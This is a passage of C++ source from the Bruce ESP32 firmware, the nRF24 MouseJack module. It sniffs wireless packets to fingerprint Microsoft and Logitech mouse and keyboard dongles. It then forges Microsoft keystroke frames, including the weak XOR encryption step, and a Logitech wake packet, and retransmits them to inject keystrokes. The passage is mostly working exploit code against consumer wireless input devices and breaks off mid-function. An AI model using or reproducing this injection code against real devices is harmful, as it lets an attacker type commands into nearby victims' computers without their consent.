viniciushnf/ESP32-S3-Bruce-ST7735-1.8/bruce-firmware/src/modules/NRF24/nrf_mousejack.cpp
    idx = mj_targetCount++;
    memcpy(mj_targets[idx].address, addr, addrLen);
    mj_targets[idx].addrLen = addrLen;
    mj_targets[idx].channel = channel;
    mj_targets[idx].type = type;
    mj_targets[idx].active = true;

    Serial.printf(
        "[MJ] Target #%d: type=%d ch=%d addr=%02X:%02X:%02X:%02X:%02X\n",
        idx,
        type,
        channel,
        addr[0],
        addr[1],
        addrLen > 2 ? addr[2] : 0,
        addrLen > 3 ? addr[3] : 0,
        addrLen > 4 ? addr[4] : 0
    );
    return idx;
}

static bool mj_validateNrfMode() {
    if (!CHECK_NRF_SPI(mj_nrfMode)) {
        displayError("MouseJack needs SPI mode", true);
        return false;
    }
    return true;
}

// ── Fingerprinting ──────────────────────────────────────────────
static void
mj_fingerprintPayload(const uint8_t *payload, uint8_t size, const uint8_t *addr, uint8_t channel) {
    // Microsoft Mouse detection:
    // size==19 && payload[0]==0x08 && payload[6]==0x40 → unencrypted
    // size==19 && payload[0]==0x0A → encrypted
    if (size == 19) {
        if (payload[0] == 0x08 && payload[6] == 0x40) {
            mj_addTarget(addr, 5, channel, MJ_DEVICE_MICROSOFT);
            return;
        }
        if (payload[0] == 0x0A) {
            mj_addTarget(addr, 5, channel, MJ_DEVICE_MS_CRYPT);
            return;
        }
    }

    // Logitech detection (first byte is always 0x00):
    //   size==10 && payload[1]==0xC2 → keepalive
    //   size==10 && payload[1]==0x4F → mouse movement
    //   size==22 && payload[1]==0xD3 → encrypted keystroke
    //   size==5  && payload[1]==0x40 → wake-up
    if (payload[0] == 0x00) {
        bool isLogitech = false;
        if (size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F)) isLogitech = true;
        if (size == 22 && payload[1] == 0xD3) isLogitech = true;
        if (size == 5 && payload[1] == 0x40) isLogitech = true;
        if (isLogitech) {
            mj_addTarget(addr, 5, channel, MJ_DEVICE_LOGITECH);
            return;
        }
    }
}

static void mj_fingerprint(const uint8_t *rawBuf, uint8_t size, uint8_t channel) {
    if (size < 10) return;

    uint8_t buf[37];
    if (size > 37) size = 37;
    memcpy(buf, rawBuf, size);

    // Try both raw buffer and 1-bit right-shifted version
    // (handles both 0xAA and 0x55 preamble alignments)
    for (int offset = 0; offset < 2; offset++) {
        if (offset == 1) {
            memcpy(buf, rawBuf, size);
            for (int x = size - 1; x >= 0; x--) {
                if (x > 0) buf[x] = (buf[x - 1] << 7) | (buf[x] >> 1);
                else buf[x] = buf[x] >> 1;
            }
        }

        // Read payload length from PCF (upper 6 bits of byte [5])
        uint8_t payloadLength = buf[5] >> 2;

        if (payloadLength == 0 || payloadLength > (size - 9)) continue;

        // Extract and verify CRC16-CCITT
        uint16_t crcGiven = ((uint16_t)buf[6 + payloadLength] << 9) | ((uint16_t)buf[7 + payloadLength] << 1);
        crcGiven = (crcGiven << 8) | (crcGiven >> 8);
        if (buf[8 + payloadLength] & 0x80) crcGiven |= 0x0100;

        uint16_t crcCalc = 0xFFFF;
        for (int x = 0; x < 6 + payloadLength; x++) { crcCalc = mj_crcUpdate(crcCalc, buf[x], 8); }
        crcCalc = mj_crcUpdate(crcCalc, buf[6 + payloadLength] & 0x80, 1);
        crcCalc = (crcCalc << 8) | (crcCalc >> 8);

        if (crcCalc != crcGiven) continue;

        // CRC verified! Extract address and payload
        uint8_t addr[5];
        memcpy(addr, buf, 5);

        uint8_t esbPayload[32];
        for (int x = 0; x < payloadLength; x++) {
            esbPayload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
        }

        mj_fingerprintPayload(esbPayload, payloadLength, addr, channel);
        return;
    }
}

// ── Microsoft Protocol Helpers ──────────────────────────────────
static void mj_msChecksum(uint8_t *payload, uint8_t size) {
    uint8_t checksum = 0;
    for (uint8_t i = 0; i < size - 1; i++) checksum ^= payload[i];
    payload[size - 1] = ~checksum;
}

static void mj_msCrypt(uint8_t *payload, uint8_t size, const uint8_t *addr) {
    for (uint8_t i = 4; i < size; i++) { payload[i] ^= addr[((i - 4) % 5)]; }
}

// ── Transmit with retransmission ────────────────────────────────
static void mj_transmitReliable(const uint8_t *frame, uint8_t len) {
    for (int r = 0; r < ATTACK_RETRANSMITS; r++) {
        NRFradio.write(frame, len, true); // multicast = no ACK wait
    }
}

static void mj_logTransmit(const MjTarget &target, uint8_t meta, const uint8_t *keys, uint8_t keysLen);

static void mj_logitechWake(const MjTarget &target) {
    if (target.type != MJ_DEVICE_LOGITECH) return;

    // Common Logitech wake/sleep-timer packet seen in MouseJack tooling
    uint8_t hello[10] = {0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED};
    mj_transmitReliable(hello, sizeof(hello));
    delay(12);

    // Neutral keepalive frame after wake-up
    uint8_t neutral = MJ_KEY_NONE;
    mj_logTransmit(target, MJ_MOD_NONE, &neutral, 1);
    delay(8);
}

// ── Microsoft Keystroke Transmit ────────────────────────────────
static void mj_msTransmit(const MjTarget &target, uint8_t meta, uint8_t hid) {
    uint8_t frame[19];
    memset(frame, 0, sizeof(frame));

    frame[0] = 0x08;
    frame[4] = (uint8_t)(mj_msSequence & 0xFF);
    frame[5] = (uint8_t)((mj_msSequence >> 8) & 0xFF);
    frame[6] = 0x43;
    frame[7] = meta;
    frame[9] = hid;
    mj_msSequence++;
    mj_msChecksum(frame, sizeof(frame));
    if (target.type == MJ_DEVICE_MS_CRYPT) { mj_msCrypt(frame, sizeof(frame), target.address); }

    // Key-down
    mj_transmitReliable(frame, sizeof(frame));
    delay(5);

    // Key-up (null keystroke)
    if (target.type == MJ_DEVICE_MS_CRYPT) { mj_msCrypt(frame, sizeof(frame), target.address); }
    for (int n = 4; n < 18; n++) frame[n] = 0;
    frame[4] = (uint8_t)(mj_msSequence & 0xFF);
    frame[5] = (uint8_t)((mj_msSequence >> 8) & 0xFF);
    frame[6] = 0x43;
    mj_msSequence++;
    mj_msChecksum(frame, sizeof(frame));
    if (target.type == MJ_DEVICE_MS_CRYPT) { mj_msCrypt(frame, sizeof(frame), target.address); }

